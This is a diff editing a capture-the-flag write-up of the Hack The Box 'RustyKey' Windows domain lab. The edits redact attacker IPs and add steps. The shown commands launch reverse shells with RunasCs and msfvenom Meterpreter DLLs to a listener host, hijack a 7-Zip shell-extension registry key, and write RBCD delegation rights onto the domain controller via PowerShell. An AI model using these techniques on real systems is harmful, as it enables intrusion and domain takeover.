@@ -298,14 +298,14 @@ RunasCs.exe is uploaded to the target machine and used to spawn a reverse shell 
 Info: Uploading /home/xpl0riz0n/ctf_OpenVPN//RunasCs.exe to C:\Users\bb.morgan\Documents\RunasCs.exe
 Data: 68948 bytes of 68948 bytes copied
 Info: Upload successful!
-*Evil-WinRM* PS C:\Users\bb.morgan\Documents> .\RunasCS.exe ee.reed Abc123456@ powershell.exe -r 10.10.16.47:6666
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents> .\RunasCS.exe ee.reed Abc123456@ powershell.exe -r 10.10.XX.XX:6666
 ...
 [+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6836 created in background.
 A listener on the attacker machine receives the connection.
 
 [xpl0riz0n㉿XPl0RIz0n] /home/xpl0riz0n/ctf_OpenVPN/  ❯ nc -lvnp 6666
 listening on [any] 6666 ...
-connect to [10.10.16.47] from (UNKNOWN) [10.10.11.75] 62377
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] 62377
 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\Windows\system32> whoami
 rustykey\ee.reed
@@ -323,57 +323,108 @@ HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
 End of search: 14 match(es) found.
 ```
 
+![EE.REED](Pictures/htb_outbound_morgan_revdll_mod.png)
+
 msfvenom is used to create a malicious DLL for a reverse Meterpreter shell.
 
 ```
-[xpl0riz0n㉿XPl0RIz0n] /home/xpl0riz0n/ctf_OpenVPN/  ❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.47 LPORT=4444 -f dll -o hack.dll
+[xpl0riz0n㉿XPl0RIz0n] /home/xpl0riz0n/ctf_OpenVPN/  ❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=4444 -f dll -o rev.dll
 ...
 Payload size: 510 bytes
 Final size of dll file: 9216 bytes
-Saved as: hack.dll
+Saved as: rev.dll
 ```
 
-The malicious DLL is uploaded, and the registry key for the 7-Zip Shell Extension is modified to point to it.
+The malicious DLL is uploaded to C:\tmp via bb.morgan  and the registry key for the 7-Zip Shell Extension is modified to point to it.
 
+bb.morgan
 ```
-PS C:\tmp> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\tmp\hack.dll" /f
+$clsid = 'HKLM:\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}'
+Set-ItemProperty "$clsid\InprocServer32" '(default)' 'C:\tmp\rev.dll'
+```
+
+EE.REED
+```
+PS C:\tmp> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\tmp\rev.dll" /f
 The operation completed successfully.
 ```
-A Meterpreter listener is started, and a session is opened when the registry key is triggered. The session reveals the user mm.turner.
+
+bb.morgan
+```
+Upload Power.ps1
+```
+
+Powershell
+```
+$ComputerSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-3316070415-896458127-4139322052-1125")
+
+$SD = New-Object System.DirectoryServices.ActiveDirectorySecurity
+
+$SD.SetOwner($ComputerSID)
+
+$SD.SetGroup($ComputerSID)
+
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($ComputerSID, "GenericAll", "Allow")
+
+$SD.AddAccessRule($ACE)
+
+$BinarySD = $SD.GetSecurityDescriptorBinaryForm()
+
+Set-ADComputer -Identity "DC" -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $BinarySD}
+
+(TO CHECK IF EVERYTHING IS OK)
+Get-ADComputer DC -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+```
+
+![Powershell](Pictures/htb_outbound_Poerps1.png)
+
+A session is opened when the registry key is triggered. The session reveals the user mm.turner.
 
 ![BH Start](Pictures/htb_Rustykey_bh_start7.png)
 
 ```
-msf6 exploit(multi/handler) > run
-[*] Started reverse TCP handler on 10.10.16.47:4444
-[*] Sending stage (203846 bytes) to 10.10.11.75
-[*] Meterpreter session 1 opened (10.10.16.47:4444 -> 10.10.11.75:62445) at 2025-07-01 11:32:19 -0400
-meterpreter > getuid
-Server username: RUSTYKEY\mm.turner
-meterpreter >
-RBCD
-The mm.turner account has AddAllowedToAct permissions. This allows for a Resource-based constrained delegation (RBCD) attack. The IT-COMPUTER3$ account is used to impersonate the backupadmin account.
+python3 penelope.py -i tun0 1234
+[+] Listening for reverse shells on 10.10.XX.XX:1234 
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from DC-10.10.XX.XX-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
+[+] Added readline support...
+[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-D 
+[+] Logging to /home/xpl0riz0n/.penelope/DC~10.10.XX.XX_Microsoft_Windows_Server_2019_Standard_x64-based_PC/2025_08_07-09_50_40-440.log 📜                                                
+─────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows>whoami
+whoami
+rustykey\mm.turner
 
-meterpreter > shell
-Process 11164 created.
-Channel 1 created.
-Microsoft Windows [Version 10.0.17763.7434]
-(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows>powershell C:\tmp\Power.ps1
+powershell C:\tmp\Power.ps1
 
-C:\Windows>powershell.exe
-powershell.exe
-Windows PowerShell 
-Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
-Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
+DistinguishedName                        : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                              : dc.rustykey.htb
+Enabled                                  : True
+msDS-AllowedToActOnBehalfOfOtherIdentity : System.DirectoryServices.ActiveDirectorySecurity
+Name                                     : DC
+ObjectClass                              : computer
+ObjectGUID                               : dee94947-219e-4b13-9d41-543a4085431c
+SamAccountName                           : DC$
+SID                                      : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                        : 
+
+
+
+
+
 ```
+
+![M](Pictures/htb_outbound_turner.png)
 
 ![Elevate](Pictures/htb_Rustykey_eed_elevated.png)
 
 A service ticket is requested for the backupadmin account, impersonating it.
 
 ![BH Start](Pictures/htb_Rustykey_bh_start8.png)
+
 
 ```
 [xpl0riz0n㉿XPl0RIz0n] /home/xpl0riz0n/ctf_OpenVPN/  ❯ export KRB5CCNAME=/home/xpl0riz0n/ctf_OpenVPN//IT-COMPUTER3\$.ccache
@@ -384,6 +435,8 @@ A service ticket is requested for the backupadmin account, impersonating it.
 
 [xpl0riz0n㉿XPl0RIz0n] /home/xpl0riz0n/ctf_OpenVPN/  ❯ export KRB5CCNAME=/home/xpl0riz0n/ctf_OpenVPN//backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
 ```
+
+
 
 Finally, wmiexec is used to get a shell as backupadmin.
 
